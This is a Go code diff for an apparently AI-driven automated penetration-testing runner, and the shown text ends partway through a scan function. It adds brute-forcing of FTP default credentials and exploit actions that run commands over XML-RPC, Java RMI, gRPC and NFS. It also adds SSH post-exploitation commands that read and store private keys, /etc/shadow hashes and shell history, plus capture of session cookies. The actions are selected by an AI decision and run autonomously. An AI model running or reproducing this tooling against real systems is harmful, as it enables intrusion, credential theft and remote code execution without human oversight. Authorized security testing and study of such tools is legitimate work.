@@ -1,8 +1,10 @@
 package ai
 
 import (
+	"bufio"
 	"context"
 	"fmt"
+	"net"
 	"os/exec"
 	"strconv"
 	"strings"
@@ -243,6 +245,8 @@ func (r *AutoRunner) executeAction(ctx context.Context, decision *AIDecision) (*
 		return r.actionSubdomainEnum(ctx, action, decision)
 	case "ssl_scan":
 		return r.actionSSLScan(ctx, action, decision)
+	case "ssl_connect":
+		return r.actionSSLConnect(ctx, action, decision)
 	case "api_fuzz":
 		return r.actionAPIFuzz(ctx, action, decision)
 	case "crack_hash":
@@ -253,6 +257,20 @@ func (r *AutoRunner) executeAction(ctx context.Context, decision *AIDecision) (*
 		return r.actionMongoDBCheck(ctx, action, decision)
 	case "postgres_check":
 		return r.actionPostgresCheck(ctx, action, decision)
+	case "xmlrpc_exploit":
+		return r.actionXMLRPCExploit(ctx, action, decision)
+	case "jsonrpc_exploit":
+		return r.actionJSONRPCExploit(ctx, action, decision)
+	case "rmi_exploit":
+		return r.actionRMIExploit(ctx, action, decision)
+	case "rpcbind_scan":
+		return r.actionRPCBindScan(ctx, action, decision)
+	case "nfs_exploit":
+		return r.actionNFSExploit(ctx, action, decision)
+	case "grpc_exploit":
+		return r.actionGRPCExploit(ctx, action, decision)
+	case "msrpc_scan":
+		return r.actionMSRPCScan(ctx, action, decision)
 	default:
 		action.Result = fmt.Sprintf("Unknown action: %s", decision.Action)
 		action.Success = false
@@ -615,47 +633,6 @@ func (r *AutoRunner) actionSSHExec(ctx context.Context, action *Action, decision
 	return action, nil
 }
 
-func (r *AutoRunner) actionFTPLogin(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
-	if err := r.framework.Use("auxiliary/scanner/ftp/ftp_login"); err != nil {
-		action.Result = fmt.Sprintf("Module error: %v", err)
-		action.Success = false
-		return action, err
-	}
-
-	module := r.framework.Current()
-	module.SetOption("RHOSTS", decision.Target)
-
-	if port := getOpt(decision.Options, "port"); port != "" {
-		module.SetOption("RPORT", port)
-	}
-
-	result, err := module.Run(ctx)
-	if err != nil {
-		action.Result = fmt.Sprintf("FTP login failed: %v", err)
-		action.Success = false
-		return action, err
-	}
-
-	for _, cred := range result.Credentials {
-		cf := CredentialFind{
-			Username: cred.Username,
-			Password: cred.Password,
-			Service:  "ftp",
-			Target:   decision.Target,
-		}
-		r.state.Credentials = append(r.state.Credentials, cf)
-
-		if r.callbacks.OnCredential != nil {
-			r.callbacks.OnCredential(cf)
-		}
-	}
-
-	action.Result = result.Output
-	action.Success = result.Success
-
-	return action, nil
-}
-
 func (r *AutoRunner) actionFTPAnon(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
 	if err := r.framework.Use("auxiliary/scanner/ftp/anonymous"); err != nil {
 		action.Result = fmt.Sprintf("Module error: %v", err)
@@ -774,14 +751,36 @@ func (r *AutoRunner) actionRedisCheck(ctx context.Context, action *Action, decis
 	}
 
 	if result.Success {
+		// Build evidence from Redis data
+		var evidence strings.Builder
+		evidence.WriteString("Redis Unauthenticated Access\n")
+		evidence.WriteString(fmt.Sprintf("Target: %s:6379\n", decision.Target))
+		evidence.WriteString("Connection: SUCCESS (no password required)\n")
+
+		if info, ok := result.Data["info"].(string); ok && info != "" {
+			evidence.WriteString(fmt.Sprintf("\nRedis Server Info:\n%s\n", info))
+		}
+		if keys, ok := result.Data["keys"].([]string); ok && len(keys) > 0 {
+			evidence.WriteString(fmt.Sprintf("\nExposed Keys (sample): %v\n", keys[:min(10, len(keys))]))
+		}
+		if dbsize, ok := result.Data["dbsize"].(int); ok {
+			evidence.WriteString(fmt.Sprintf("Database Size: %d keys\n", dbsize))
+		}
+
 		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
 			Type:        "redis_unauth",
 			Severity:    "critical",
 			Target:      decision.Target,
-			Description: "Redis accessible without authentication",
-			Remediation: "Enable Redis authentication with requirepass",
+			Service:     "redis",
+			Description: "Redis server accessible without authentication - allows full database access, potential data exfiltration, and RCE via EVAL",
+			Evidence:    evidence.String(),
+			Remediation: "Enable Redis authentication with requirepass directive. Bind to localhost only or use firewall rules. Consider using Redis ACLs for fine-grained access control.",
 			Timestamp:   time.Now(),
 		})
+
+		if r.callbacks.OnFinding != nil {
+			r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
+		}
 	}
 
 	action.Result = result.Output
@@ -1116,8 +1115,20 @@ func (r *AutoRunner) actionSSHRecon(ctx context.Context, action *Action, decisio
 	username := getOpt(decision.Options, "username")
 	password := getOpt(decision.Options, "password")
 
+	// If no credentials provided, try to find them from state
 	if username == "" || password == "" {
-		action.Result = "SSH recon requires username and password"
+		targetKey := fmt.Sprintf("%s:%s", target, port)
+		for _, cred := range r.state.Credentials {
+			if cred.Service == "ssh" && (cred.Target == targetKey || cred.Target == target) {
+				username = cred.Username
+				password = cred.Password
+				break
+			}
+		}
+	}
+
+	if username == "" || password == "" {
+		action.Result = "SSH recon requires username and password - none found in state"
 		action.Success = false
 		return action, nil
 	}
@@ -1135,17 +1146,25 @@ func (r *AutoRunner) actionSSHRecon(ctx context.Context, action *Action, decisio
 		{"cat /etc/passwd | head -20", "User Accounts"},
 		{"cat /etc/shadow 2>/dev/null | head -10 || echo 'No access to shadow'", "Password Hashes (if root)"},
 		{"ls -la /home/", "Home Directories"},
+		{"ls -la ~/.ssh/ 2>/dev/null || echo 'No .ssh directory'", "SSH Directory Contents"},
+		{"cat ~/.ssh/id_rsa 2>/dev/null | head -30 || cat ~/.ssh/id_ed25519 2>/dev/null | head -30 || echo 'No SSH private key found'", "SSH Private Keys (CRITICAL!)"},
+		{"cat ~/.ssh/authorized_keys 2>/dev/null || echo 'No authorized_keys'", "SSH Authorized Keys"},
+		{"cat ~/.ssh/known_hosts 2>/dev/null | head -20 || echo 'No known_hosts'", "SSH Known Hosts"},
 		{"cat /etc/hosts", "Network Hosts"},
 		{"netstat -tulpn 2>/dev/null || ss -tulpn", "Listening Services"},
 		{"ps aux | head -20", "Running Processes"},
 		{"cat /etc/crontab 2>/dev/null", "Scheduled Tasks"},
-		{"find /home -name '*.txt' -o -name '*.conf' -o -name '*.key' -o -name '*.pem' 2>/dev/null | head -20", "Sensitive Files"},
+		{"find /home -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.key' 2>/dev/null", "All SSH/Private Keys Found"},
+		{"find /root -name 'id_rsa' -o -name '*.pem' -o -name '*.key' 2>/dev/null || echo 'No access to /root'", "Root SSH Keys"},
 		{"cat ~/.bash_history 2>/dev/null | head -30", "Command History"},
 		{"env | grep -i pass || echo 'No password in env'", "Environment Variables"},
 	}
 
 	var sb strings.Builder
 	sb.WriteString(fmt.Sprintf("\n=== POST-EXPLOITATION RECON ON %s:%s as %s ===\n\n", target, port, username))
+
+	var extractedKeys []string
+	var extractedHashes []string
 
 	for _, recon := range reconCommands {
 		module.SetOption("CMD", recon.cmd)
@@ -1157,10 +1176,57 @@ func (r *AutoRunner) actionSSHRecon(ctx context.Context, action *Action, decisio
 		} else if result.Output != "" {
 			sb.WriteString(result.Output)
 			sb.WriteString("\n")
+
+			// Extract SSH private keys for customer proof
+			if strings.Contains(recon.desc, "SSH Private Keys") && strings.Contains(result.Output, "BEGIN") {
+				extractedKeys = append(extractedKeys, result.Output)
+				sb.WriteString("\n[!] CRITICAL: SSH PRIVATE KEY EXTRACTED - Full access possible!\n")
+			}
+
+			// Extract shadow hashes if found
+			if strings.Contains(recon.desc, "Password Hashes") && strings.Contains(result.Output, "$") {
+				lines := strings.Split(result.Output, "\n")
+				for _, line := range lines {
+					if strings.Contains(line, "$") && strings.Contains(line, ":") {
+						parts := strings.Split(line, ":")
+						if len(parts) >= 2 {
+							extractedHashes = append(extractedHashes, line)
+						}
+					}
+				}
+				if len(extractedHashes) > 0 {
+					sb.WriteString("\n[!] CRITICAL: PASSWORD HASHES EXTRACTED FROM /etc/shadow!\n")
+				}
+			}
 		} else {
 			sb.WriteString("(no output)\n")
 		}
 		sb.WriteString("\n")
+	}
+
+	// Store extracted keys as credentials for the report
+	if len(extractedKeys) > 0 {
+		for i, key := range extractedKeys {
+			r.state.Credentials = append(r.state.Credentials, CredentialFind{
+				Username: fmt.Sprintf("ssh_private_key_%d", i+1),
+				Password: key,
+				Service:  "ssh_key_extracted",
+				Target:   fmt.Sprintf("%s:%s", target, port),
+			})
+		}
+	}
+
+	// Store extracted shadow hashes
+	for _, hash := range extractedHashes {
+		parts := strings.Split(hash, ":")
+		if len(parts) >= 2 {
+			r.state.Credentials = append(r.state.Credentials, CredentialFind{
+				Username: parts[0],
+				Hash:     parts[1],
+				Service:  "shadow_hash",
+				Target:   fmt.Sprintf("%s:%s", target, port),
+			})
+		}
 	}
 
 	// Add critical finding
@@ -2027,6 +2093,134 @@ func (r *AutoRunner) actionSSLScan(ctx context.Context, action *Action, decision
 	return action, nil
 }
 
+// actionSSLConnect establishes persistent SSL connection using openssl s_client
+func (r *AutoRunner) actionSSLConnect(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	connector := exploit.NewOpenSSLConnection()
+
+	// Parse target
+	target := decision.Target
+	port := "443"
+
+	// Strip protocol if present
+	target = strings.TrimPrefix(target, "https://")
+	target = strings.TrimPrefix(target, "http://")
+
+	// Strip path if present
+	if idx := strings.Index(target, "/"); idx != -1 {
+		target = target[:idx]
+	}
+
+	// Extract port if present
+	if strings.Contains(target, ":") {
+		parts := strings.Split(target, ":")
+		target = parts[0]
+		port = parts[1]
+	}
+
+	connector.SetOption("RHOSTS", target)
+	connector.SetOption("RPORT", port)
+
+	if monitorTime := getOpt(decision.Options, "monitor_time"); monitorTime != "" {
+		connector.SetOption("MONITOR_TIME", monitorTime)
+	} else {
+		// Default to 30 seconds for auto mode
+		connector.SetOption("MONITOR_TIME", "30")
+	}
+
+	if sni := getOpt(decision.Options, "sni"); sni != "" {
+		connector.SetOption("SNI", sni)
+	}
+
+	if starttls := getOpt(decision.Options, "starttls"); starttls != "" {
+		connector.SetOption("STARTTLS", starttls)
+	}
+
+	result, err := connector.Run(ctx)
+	if err != nil {
+		action.Result = fmt.Sprintf("SSL connection failed: %v", err)
+		action.Success = false
+		return action, err
+	}
+
+	// Build evidence from SSL analysis
+	var evidence strings.Builder
+	evidence.WriteString("SSL/TLS Connection Analysis\n")
+	evidence.WriteString(fmt.Sprintf("Target: %s:%s\n", target, port))
+
+	if protocol, ok := result.Data["protocol"].(string); ok {
+		evidence.WriteString(fmt.Sprintf("Protocol: %s\n", protocol))
+	}
+	if cipher, ok := result.Data["cipher"].(string); ok {
+		evidence.WriteString(fmt.Sprintf("Cipher Suite: %s\n", cipher))
+	}
+	if certInfo, ok := result.Data["certificate"].(string); ok {
+		evidence.WriteString(fmt.Sprintf("Certificate:\n%s\n", certInfo))
+	}
+
+	// Store any captured cookies
+	var cookiesFound []string
+	if result.Success {
+		if cookies, ok := result.Data["cookies"].([]string); ok && len(cookies) > 0 {
+			evidence.WriteString("Captured Session Cookies:\n")
+			for _, cookie := range cookies {
+				cookiesFound = append(cookiesFound, cookie)
+				evidence.WriteString(fmt.Sprintf("  - %s\n", cookie))
+				r.state.Credentials = append(r.state.Credentials, CredentialFind{
+					Username: "session_cookie",
+					Password: cookie,
+					Service:  "ssl_captured",
+					Target:   fmt.Sprintf("%s:%s", target, port),
+				})
+
+				if r.callbacks.OnCredential != nil {
+					r.callbacks.OnCredential(CredentialFind{
+						Username: "session_cookie",
+						Password: cookie,
+						Service:  "ssl_captured",
+						Target:   fmt.Sprintf("%s:%s", target, port),
+					})
+				}
+			}
+		}
+
+		if sensitive, ok := result.Data["sensitive_data"].([]string); ok && len(sensitive) > 0 {
+			evidence.WriteString("Sensitive Data Captured:\n")
+			for _, data := range sensitive {
+				evidence.WriteString(fmt.Sprintf("  - %s\n", data))
+			}
+		}
+
+		// Determine severity based on findings
+		severity := "info"
+		description := "SSL connection established and monitored for traffic"
+		if len(cookiesFound) > 0 {
+			severity = "medium"
+			description = "SSL traffic analysis captured session cookies"
+		}
+
+		// Record connection success
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+			Type:        "ssl_traffic_analysis",
+			Severity:    severity,
+			Target:      fmt.Sprintf("%s:%s", target, port),
+			Service:     "https",
+			Description: description,
+			Evidence:    evidence.String(),
+			Remediation: "Ensure TLS 1.2+ is enforced. Use secure cipher suites. Implement certificate pinning for sensitive applications. Set Secure and HttpOnly flags on cookies.",
+			Timestamp:   time.Now(),
+		})
+
+		if r.callbacks.OnFinding != nil {
+			r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
+		}
+	}
+
+	action.Result = result.Output
+	action.Success = result.Success
+
+	return action, nil
+}
+
 // actionAPIFuzz tests REST/GraphQL APIs for vulnerabilities
 func (r *AutoRunner) actionAPIFuzz(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
 	if err := r.framework.Use("auxiliary/scanner/api_fuzz"); err != nil {
@@ -2388,5 +2582,597 @@ func (r *AutoRunner) actionPostgresCheck(ctx context.Context, action *Action, de
 
 	action.Result = "PostgreSQL default credentials not found"
 	action.Success = false
+	return action, nil
+}
+
+func (r *AutoRunner) actionFTPLogin(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := decision.Target
+	host := target
+	port := "21"
+
+	if strings.Contains(target, ":") {
+		parts := strings.Split(target, ":")
+		host = parts[0]
+		port = parts[1]
+	}
+
+	// Common FTP credentials
+	creds := []struct{ user, pass string }{
+		{"ftp", "ftp"},
+		{"ftpuser", "ftppass"},
+		{"ftpuser", "ftppass123"},
+		{"admin", "admin"},
+		{"admin", "admin123"},
+		{"user", "user"},
+		{"test", "test"},
+		{"guest", "guest"},
+	}
+
+	for _, c := range creds {
+		conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 5*time.Second)
+		if err != nil {
+			continue
+		}
+
+		reader := bufio.NewReader(conn)
+		reader.ReadString('\n') // banner
+
+		fmt.Fprintf(conn, "USER %s\r\n", c.user)
+		line, _ := reader.ReadString('\n')
+
+		if strings.HasPrefix(line, "331") {
+			fmt.Fprintf(conn, "PASS %s\r\n", c.pass)
+			line, _ = reader.ReadString('\n')
+
+			if strings.HasPrefix(line, "230") {
+				conn.Close()
+
+				cf := CredentialFind{
+					Username: c.user,
+					Password: c.pass,
+					Service:  "ftp",
+					Target:   target,
+				}
+				r.state.Credentials = append(r.state.Credentials, cf)
+
+				if r.callbacks.OnCredential != nil {
+					r.callbacks.OnCredential(cf)
+				}
+
+				r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+					Type:        "weak_credentials",
+					Severity:    "high",
+					Target:      target,
+					Description: fmt.Sprintf("FTP accessible with %s:%s", c.user, c.pass),
+					Timestamp:   time.Now(),
+				})
+
+				action.Result = fmt.Sprintf("FTP login successful: %s:%s", c.user, c.pass)
+				action.Success = true
+				return action, nil
+			}
+		}
+		conn.Close()
+	}
+
+	action.Result = "FTP default credentials not found"
+	action.Success = false
+	return action, nil
+}
+
+// RPC Exploit Action Handlers
+
+func (r *AutoRunner) actionXMLRPCExploit(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := decision.Target
+	if target == "" {
+		target = r.state.Target
+	}
+
+	host := target
+	port := "8086"
+	if strings.Contains(target, ":") {
+		parts := strings.Split(target, ":")
+		host = parts[0]
+		port = parts[1]
+	}
+
+	module := exploit.NewXMLRPCExploit()
+	module.SetOption("RHOSTS", host)
+	module.SetOption("RPORT", port)
+
+	if cmd := getOpt(decision.Options, "cmd"); cmd != "" {
+		module.SetOption("CMD", cmd)
+	}
+	if method := getOpt(decision.Options, "method"); method != "" {
+		module.SetOption("METHOD", method)
+	}
+
+	result, err := module.Run(ctx)
+	if err != nil {
+		action.Result = fmt.Sprintf("XML-RPC exploit error: %v", err)
+		action.Success = false
+		return action, nil
+	}
+
+	action.Result = result.Output
+	action.Success = result.Success
+
+	if result.Success {
+		// Build evidence string with captured data
+		var evidence strings.Builder
+		evidence.WriteString("XML-RPC Remote Code Execution Confirmed\n")
+		evidence.WriteString(fmt.Sprintf("Endpoint: http://%s:%s\n", host, port))
+
+		if methods, ok := result.Data["methods"].([]string); ok && len(methods) > 0 {
+			evidence.WriteString(fmt.Sprintf("Exposed Methods: %v\n", methods))
+			action.Result += fmt.Sprintf("\nMethods found: %v", methods)
+		}
+		if output, ok := result.Data["output"].(string); ok && output != "" {
+			evidence.WriteString(fmt.Sprintf("Command Output:\n%s\n", output))
+		}
+		if raw, ok := result.Data["raw_response"].(string); ok && raw != "" {
+			// Truncate if too long
+			if len(raw) > 500 {
+				raw = raw[:500] + "..."
+			}
+			evidence.WriteString(fmt.Sprintf("Response Sample:\n%s\n", raw))
+		}
+
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+			Type:        "rpc_command_injection",
+			Severity:    "critical",
+			Target:      fmt.Sprintf("%s:%s", host, port),
+			Service:     "xmlrpc",
+			Description: "XML-RPC service vulnerable to remote command execution via system.execute method",
+			Evidence:    evidence.String(),
+			Remediation: "Disable dangerous XML-RPC methods (system.execute, system.run). Implement authentication and input validation. Consider disabling XML-RPC if not needed.",
+			Timestamp:   time.Now(),
+		})
+
+		if r.callbacks.OnFinding != nil {
+			r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
+		}
+	}
+
+	return action, nil
+}
+
+func (r *AutoRunner) actionJSONRPCExploit(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := decision.Target
+	if target == "" {
+		target = r.state.Target
+	}
+
+	host := target
+	port := "8087"
+	if strings.Contains(target, ":") {
+		parts := strings.Split(target, ":")
+		host = parts[0]
+		port = parts[1]
+	}
+
+	module := exploit.NewJSONRPCExploit()
+	module.SetOption("RHOSTS", host)
+	module.SetOption("RPORT", port)
+
+	if method := getOpt(decision.Options, "method"); method != "" {
+		module.SetOption("METHOD", method)
+	}
+
+	result, err := module.Run(ctx)
+	if err != nil {
+		action.Result = fmt.Sprintf("JSON-RPC exploit error: %v", err)
+		action.Success = false
+		return action, nil
+	}
+
+	action.Result = result.Output
+	action.Success = result.Success
+
+	// Build evidence with captured data
+	var evidence strings.Builder
+	evidence.WriteString("JSON-RPC Information Disclosure\n")
+	evidence.WriteString(fmt.Sprintf("Endpoint: http://%s:%s\n", host, port))
+
+	// Capture any credentials found
+	var credsFound []string
+	for _, cred := range result.Credentials {
+		cf := CredentialFind{
+			Username: cred.Username,
+			Password: cred.Password,
+			Service:  "jsonrpc",
+			Target:   target,
+		}
+		if cred.Type == "api_key" || cred.Type == "private_key" {
+			cf.Password = cred.Hash
+			credsFound = append(credsFound, fmt.Sprintf("%s: %s", cred.Type, cred.Hash[:min(20, len(cred.Hash))]+"..."))
+		} else {
+			credsFound = append(credsFound, fmt.Sprintf("%s:%s", cred.Username, cred.Password))
+		}
+		r.state.Credentials = append(r.state.Credentials, cf)
+
+		if r.callbacks.OnCredential != nil {
+			r.callbacks.OnCredential(cf)
+		}
+	}
+
+	if len(credsFound) > 0 {
+		evidence.WriteString(fmt.Sprintf("Credentials/Keys Found:\n"))
+		for _, c := range credsFound {
+			evidence.WriteString(fmt.Sprintf("  - %s\n", c))
+		}
+	}
+
+	// Extract other data from result
+	if accounts, ok := result.Data["accounts"].([]string); ok && len(accounts) > 0 {
+		evidence.WriteString(fmt.Sprintf("Exposed Accounts: %v\n", accounts))
+	}
+	if balance, ok := result.Data["balance"].(string); ok {
+		evidence.WriteString(fmt.Sprintf("Account Balance: %s\n", balance))
+	}
+	if version, ok := result.Data["client_version"].(string); ok {
+		evidence.WriteString(fmt.Sprintf("Client Version: %s\n", version))
+	}
+
+	if result.Success {
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+			Type:        "rpc_info_disclosure",
+			Severity:    "high",
+			Target:      fmt.Sprintf("%s:%s", host, port),
+			Service:     "jsonrpc",
+			Description: "JSON-RPC service exposes sensitive information including private keys and account data",
+			Evidence:    evidence.String(),
+			Remediation: "Implement authentication for JSON-RPC endpoints. Disable sensitive methods like personal_unlockAccount. Use proper access controls and network segmentation.",
+			Timestamp:   time.Now(),
+		})
+
+		if r.callbacks.OnFinding != nil {
+			r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
+		}
+	}
+
+	return action, nil
+}
+
+func (r *AutoRunner) actionRMIExploit(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := decision.Target
+	if target == "" {
+		target = r.state.Target
+	}
+
+	host := target
+	port := "1099"
+	if strings.Contains(target, ":") {
+		parts := strings.Split(target, ":")
+		host = parts[0]
+		port = parts[1]
+	}
+
+	module := exploit.NewJavaRMIExploit()
+	module.SetOption("RHOSTS", host)
+	module.SetOption("RPORT", port)
+
+	if cmd := getOpt(decision.Options, "cmd"); cmd != "" {
+		module.SetOption("CMD", cmd)
+	}
+
+	result, err := module.Run(ctx)
+	if err != nil {
+		action.Result = fmt.Sprintf("RMI exploit error: %v", err)
+		action.Success = false
+		return action, nil
+	}
+
+	action.Result = result.Output
+	action.Success = result.Success
+
+	if result.Success {
+		// Build evidence from captured data
+		var evidence strings.Builder
+		evidence.WriteString("Java RMI Service Exploitation\n")
+		evidence.WriteString(fmt.Sprintf("Endpoint: %s:%s\n", host, port))
+
+		if objects, ok := result.Data["remote_objects"].([]string); ok && len(objects) > 0 {
+			evidence.WriteString("Exposed Remote Objects:\n")
+			for _, obj := range objects {
+				evidence.WriteString(fmt.Sprintf("  - %s\n", obj))
+			}
+		}
+		if output, ok := result.Data["output"].(string); ok && output != "" {
+			evidence.WriteString(fmt.Sprintf("Command Output:\n%s\n", output))
+		}
+		if sysInfo, ok := result.Data["system_info"].(string); ok && sysInfo != "" {
+			evidence.WriteString(fmt.Sprintf("System Info:\n%s\n", sysInfo))
+		}
+		if secrets, ok := result.Data["secrets"].(string); ok && secrets != "" {
+			evidence.WriteString(fmt.Sprintf("Exposed Secrets:\n%s\n", secrets))
+		}
+
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+			Type:        "java_rmi_rce",
+			Severity:    "critical",
+			Target:      fmt.Sprintf("%s:%s", host, port),
+			Service:     "java-rmi",
+			Description: "Java RMI service vulnerable to remote code execution and information disclosure",
+			Evidence:    evidence.String(),
+			Remediation: "Restrict RMI access to trusted networks only. Remove dangerous remote methods. Implement authentication. Update Java to latest version to prevent deserialization attacks.",
+			Timestamp:   time.Now(),
+		})
+
+		if r.callbacks.OnFinding != nil {
+			r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
+		}
+	}
+
+	return action, nil
+}
+
+func (r *AutoRunner) actionRPCBindScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := decision.Target
+	if target == "" {
+		target = r.state.Target
+	}
+
+	host := target
+	port := "111"
+	if strings.Contains(target, ":") {
+		parts := strings.Split(target, ":")
+		host = parts[0]
+		port = parts[1]
+	}
+
+	module := exploit.NewRPCBindScanner()
+	module.SetOption("RHOSTS", host)
+	module.SetOption("RPORT", port)
+
+	result, err := module.Run(ctx)
+	if err != nil {
+		action.Result = fmt.Sprintf("RPCBind scan error: %v", err)
+		action.Success = false
+		return action, nil
+	}
+
+	action.Result = result.Output
+	action.Success = result.Success
+
+	// Build evidence from scan results
+	var evidence strings.Builder
+	evidence.WriteString("RPCBind/Portmapper Enumeration\n")
+	evidence.WriteString(fmt.Sprintf("Target: %s:%s\n", host, port))
+
+	if services, ok := result.Data["services"].([]string); ok && len(services) > 0 {
+		evidence.WriteString("Registered RPC Services:\n")
+		for _, svc := range services {
+			evidence.WriteString(fmt.Sprintf("  - %s\n", svc))
+		}
+	}
+
+	// Check for NFS exports with wildcard access
+	if nfsExports, ok := result.Data["nfs_exports"].(string); ok {
+		evidence.WriteString(fmt.Sprintf("NFS Exports:\n%s\n", nfsExports))
+		if strings.Contains(nfsExports, "*") {
+			r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+				Type:        "nfs_world_accessible",
+				Severity:    "high",
+				Target:      fmt.Sprintf("%s:%s", host, port),
+				Service:     "nfs/rpcbind",
+				Description: "NFS exports accessible to everyone (*) - allows unauthorized file access",
+				Evidence:    evidence.String(),
+				Remediation: "Restrict NFS exports to specific IP addresses or subnets. Remove wildcard (*) access. Implement proper authentication with Kerberos.",
+				Timestamp:   time.Now(),
+			})
+
+			if r.callbacks.OnFinding != nil {
+				r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
+			}
+		}
+	}
+
+	return action, nil
+}
+
+func (r *AutoRunner) actionNFSExploit(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := decision.Target
+	if target == "" {
+		target = r.state.Target
+	}
+
+	host := target
+	if strings.Contains(target, ":") {
+		parts := strings.Split(target, ":")
+		host = parts[0]
+	}
+
+	module := exploit.NewNFSExploit()
+	module.SetOption("RHOSTS", host)
+
+	if export := getOpt(decision.Options, "export"); export != "" {
+		module.SetOption("EXPORT", export)
+	}
+
+	result, err := module.Run(ctx)
+	if err != nil {
+		action.Result = fmt.Sprintf("NFS exploit error: %v", err)
+		action.Success = false
+		return action, nil
+	}
+
+	action.Result = result.Output
+	action.Success = result.Success
+
+	// Build evidence from NFS exploitation
+	var evidence strings.Builder
+	evidence.WriteString("NFS Share Exploitation\n")
+	evidence.WriteString(fmt.Sprintf("Target: %s\n", host))
+
+	if exports, ok := result.Data["exports"].([]string); ok && len(exports) > 0 {
+		evidence.WriteString("Accessible Exports:\n")
+		for _, exp := range exports {
+			evidence.WriteString(fmt.Sprintf("  - %s\n", exp))
+		}
+	}
+
+	// Capture any SSH keys or credentials found
+	var filesFound []string
+	for _, cred := range result.Credentials {
+		cf := CredentialFind{
+			Username: cred.Username,
+			Password: cred.Hash,
+			Service:  "nfs",
+			Target:   target,
+		}
+		r.state.Credentials = append(r.state.Credentials, cf)
+		filesFound = append(filesFound, fmt.Sprintf("%s: %s", cred.Type, cred.Username))
+
+		if r.callbacks.OnCredential != nil {
+			r.callbacks.OnCredential(cf)
+		}
+	}
+
+	if len(filesFound) > 0 {
+		evidence.WriteString("Sensitive Files Retrieved:\n")
+		for _, f := range filesFound {
+			evidence.WriteString(fmt.Sprintf("  - %s\n", f))
+		}
+	}
+
+	if files, ok := result.Data["files"].([]string); ok && len(files) > 0 {
+		evidence.WriteString("Files Found on Share:\n")
+		for _, f := range files {
+			evidence.WriteString(fmt.Sprintf("  - %s\n", f))
+		}
+	}
+
+	if result.Success {
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+			Type:        "nfs_data_exposure",
+			Severity:    "critical",
+			Target:      host,
+			Service:     "nfs",
+			Description: "NFS share accessible without authentication - sensitive data exposed including potential SSH keys and configuration files",
+			Evidence:    evidence.String(),
+			Remediation: "Restrict NFS exports to authorized hosts only. Implement NFSv4 with Kerberos authentication. Remove sensitive files from shared directories. Use proper file permissions.",
+			Timestamp:   time.Now(),
+		})
+
+		if r.callbacks.OnFinding != nil {
+			r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
+		}
+	}
+
+	return action, nil
+}
+
+func (r *AutoRunner) actionGRPCExploit(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := decision.Target
+	if target == "" {
+		target = r.state.Target
+	}
+
+	host := target
+	port := "50051"
+	if strings.Contains(target, ":") {
+		parts := strings.Split(target, ":")
+		host = parts[0]
+		port = parts[1]
+	}
+
+	module := exploit.NewGRPCExploit()
+	module.SetOption("RHOSTS", host)
+	module.SetOption("RPORT", port)
+
+	if cmd := getOpt(decision.Options, "cmd"); cmd != "" {
+		module.SetOption("CMD", cmd)
+	}
+
+	result, err := module.Run(ctx)
+	if err != nil {
+		action.Result = fmt.Sprintf("gRPC exploit error: %v", err)
+		action.Success = false
+		return action, nil
+	}
+
+	action.Result = result.Output
+	action.Success = result.Success
+
+	if result.Success {
+		// Build evidence from gRPC exploitation
+		var evidence strings.Builder
+		evidence.WriteString("gRPC Service Remote Code Execution\n")
+		evidence.WriteString(fmt.Sprintf("Endpoint: %s:%s\n", host, port))
+
+		if services, ok := result.Data["services"].([]string); ok && len(services) > 0 {
+			evidence.WriteString("Exposed Services:\n")
+			for _, svc := range services {
+				evidence.WriteString(fmt.Sprintf("  - %s\n", svc))
+			}
+		}
+		if output, ok := result.Data["output"].(string); ok && output != "" {
+			evidence.WriteString(fmt.Sprintf("Command Execution Output:\n%s\n", output))
+		}
+		if methods, ok := result.Data["methods"].([]string); ok && len(methods) > 0 {
+			evidence.WriteString("Exposed Methods:\n")
+			for _, m := range methods {
+				evidence.WriteString(fmt.Sprintf("  - %s\n", m))
+			}
+		}
+
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+			Type:        "grpc_command_injection",
+			Severity:    "critical",
+			Target:      fmt.Sprintf("%s:%s", host, port),
+			Service:     "grpc",
+			Description: "gRPC service allows unauthenticated remote command execution",
+			Evidence:    evidence.String(),
+			Remediation: "Implement gRPC authentication using TLS client certificates or token-based auth. Remove dangerous service methods. Enable gRPC reflection only in development environments.",
+			Timestamp:   time.Now(),
+		})
+
+		if r.callbacks.OnFinding != nil {
+			r.callbacks.OnFinding(r.state.Vulnerabilities[len(r.state.Vulnerabilities)-1])
+		}
+	}
+
+	return action, nil
+}
+
+func (r *AutoRunner) actionMSRPCScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := decision.Target
+	if target == "" {
+		target = r.state.Target
+	}
+
+	host := target
+	port := "135"
+	if strings.Contains(target, ":") {
+		parts := strings.Split(target, ":")
+		host = parts[0]
+		port = parts[1]
+	}
+
